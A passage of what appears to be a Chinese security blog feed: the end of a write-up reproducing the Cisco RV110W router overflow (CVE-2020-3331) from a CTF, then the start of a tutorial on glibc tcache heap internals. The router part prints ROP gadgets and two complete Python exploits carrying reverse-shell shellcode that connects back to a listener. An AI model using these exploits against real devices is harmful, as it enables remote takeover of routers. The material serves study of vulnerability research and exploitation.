|</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x28+var_8                            |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x28+var_10                           |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x70+var_58                           |  jr    0x70+var_sC($sp)                |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_s0($sp)                |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s10($sp)               |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s0($sp)                |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3020+var_1008                       |  jr    0x3020+var_s24($sp)             |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;mov $t9,$a0&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0003D050  |  move $t9,$a0                                        |  jalr  $a0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>找到两条可用的<code>gadget</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20  |  jalr  $s0  |</span><br><span class="line"></span><br><span class="line">|  0x0003D050  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>算一下溢出到<code>$s0</code>的偏移<code>0x55-0xe4+0xc0 = 0x31</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/28.jpg" class=""><p>再看看<code>shellcode</code>的偏移，暂时还不会在<code>ghidra</code>上用<code>mipsrop</code>的插件，就用了个笨办法，在IDA上先找<code>gadget</code>然后，再来<code>ghidra</code>看偏移，可以看到我们<code>shellcode</code>的偏移为0x18，至此，所有的准备工作已经完成！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/29.jpg" class=""><p>再启动一个终端，监听<code>shellcode</code>中回连的端口，等待反弹<code>shell</code>，完整<code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x31</span> + p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>监听的终端已经看到反弹<code>shell</code>了，泪目~</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/24.png" class=""><p><code>exp</code>的另一种写法，加入<code>pwntools</code>的<code>wait_for_connection</code>模块来实现的，这样就不用开多一个终端监听：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move $t9,$a0 ; jalr $a0 </span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr $s0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#LHOST=192.168.1.101 LPORT=8888 </span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="string">&#x27;b&#x27;</span>*(<span class="number">85</span>-<span class="number">49</span>-<span class="number">4</span>)+p32(jmp_s0)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">pd2 = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:pd1,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        requests.post(url, data=pd2, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#创建一个TCP或UDP套接字以接收数据 </span></span><br><span class="line">thread.start_new_thread(attack,())</span><br><span class="line"><span class="comment">#开始一个新的线程，从attack函数开始运行 </span></span><br><span class="line">io.wait_for_connection()</span><br><span class="line"><span class="comment">#阻塞直到建立连接 </span></span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>被<code>xuanxuan</code>老师带坑的第一个真实的IOT设备，复现之路异常坎坷，但不管怎么样最终还是复现出来了，学到不少知识，不过还有一些细节问题还没解决，后面慢慢看吧！加油，路还很长，任重而道远！</p><h4 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h4><p><a href="https://xuanxuanblingbling.github.io/iot/2020/10/26/rv110w/">思科路由器 RV110W CVE-2020-3331 漏洞复现</a></p><p><a href="https://www.anquanke.com/post/id/159183">360代码卫士帮助思科公司修复多个产品高危安全漏洞（附详细技术分析）</a></p><p><a href="https://la13x.github.io/2021/08/31/Real-World-Cisco-RV110W/#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">强网杯2020决赛 Cisco RV110W路由器复现</a></p><p><a href="https://xiaoxin.zone/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/">思科路由器RV110W-CVE-2020-3331/CVE-2020-3323漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞系列（二）-- tache bin attack</title>
      <link href="/2021/10/05/tache-bin-attack/"/>
      <url>/2021/10/05/tache-bin-attack/</url>
      
        <content type="html"><![CDATA[<blockquote><p>一直以来都是做<code>libc-2.23</code>的堆题，<code>tache</code>也很少涉及，这次来系统的看一下<code>tache</code>这个在<code>libc-2.26</code>版本中新引入的机制到底是怎么样的？它有什么奇妙的玩法？一起来看看吧</p></blockquote><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>tache新增了两个结构体，一个是 <strong>tcache_entry</strong> ，另一个是<strong>tcache_perthread_struct</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>有两个特别重要的函数，是关于<code>tache</code>链入和脱链的操作，可以看到<code>tache</code>链入和脱链的检查十分的少，跟<code>fastbin</code>相比真的不多，甚至可以说没有检查…，所以说<code>tache</code>的存在让堆利用更简单了一点，所以说不要怕，它并不可怕！</p><ul><li><code>fastbin</code>有对<code>size</code>进行检查，如果<code>size</code>不同放在同一个链表里面就会报错，<code>tache</code>没得</li><li><code>fastbin</code>有<code>double free</code>检查，在早期的<code>tache</code>中也没有</li></ul><p>链入：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脱链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">tcache_get</span> <span class="params">(<span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先写个<code>demo</code>简单认识一下<code>tache</code>在<code>bin</code>中的怎么样的…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//查看tache</span></span><br><span class="line"><span class="keyword">void</span> *chunk_1,*chunk_2,*chunk_3,*chunk_4;</span><br><span class="line"><span class="keyword">void</span> *chunk_5,*chunk_6,*chunk_7;</span><br><span class="line"></span><br><span class="line">chunk_1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">chunk_4 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk_5 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">chunk_6 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">chunk_7 = <span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_1);</span><br><span class="line"><span class="built_in">free</span>(chunk_2);</span><br><span class="line"><span class="built_in">free</span>(chunk_3);</span><br><span class="line"><span class="built_in">free</span>(chunk_4);</span><br><span class="line"><span class="built_in">free</span>(chunk_5);</span><br><span class="line"><span class="built_in">free</span>(chunk_6);</span><br><span class="line"><span class="built_in">free</span>(chunk_7);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//宏定义define TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行之后看<code>bin</code>，我们看到<code>fastbin</code>已经有了一个堆块，说明<code>tache</code>最多只能存放7个堆块，这也是<code>tache</code>可玩的机制之一</p><img src="/2021/10/05/tache-bin-attack/1.png" class=""><p>还记得<code>tcache_perthread_struct</code>这个结构体吗？系统为它分配了一个0x250的堆块来存放这个结构体的内容，我们来看看里面的内容，上面的小框框是记录堆块数量的，从0x20开始一直到0x400，一般的利用也到不了0x400，所以就没展示，下面的大框框就是各个大小的堆块首个堆块的地址，可以对比上图来看</p><img src="/2021/10/05/tache-bin-attack/2.jpg" class=""><p>引用wiki上的一段话</p><blockquote><p>在内存分配的<code>malloc</code>函数中有多处，会将内存块移入<code>tcache</code>中。</p><p>（1）首先，申请的内存块符合<code>fastbin</code>大小时并且在<code>fastbin</code>内找到可用的空闲块时，会把该<code>fastbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（2）其次，申请的内存块符合<code>smallbin</code>大小时并且在<code>smallbin</code>内找到可用的空闲块时，会把该<code>smallbin</code>链上的其他内存块放入<code>tcache</code>中。</p><p>（3）当在<code>unsorted bin</code>链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到<code>tcache</code>中，继续处理。</p></blockquote><p>其实也很好理解，就是分配的时候会先从<code>tache</code>中取，然后把符合对应大小的堆块的整理到<code>tache</code>中，改一下上面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);<span class="comment">//断点</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下断点之后，发现<code>malloc</code>三个堆块<code>fastbin</code>里面一个都没动，全部都是<code>tache</code>里面拿的</p><img src="/2021/10/05/tache-bin-attack/3.png" 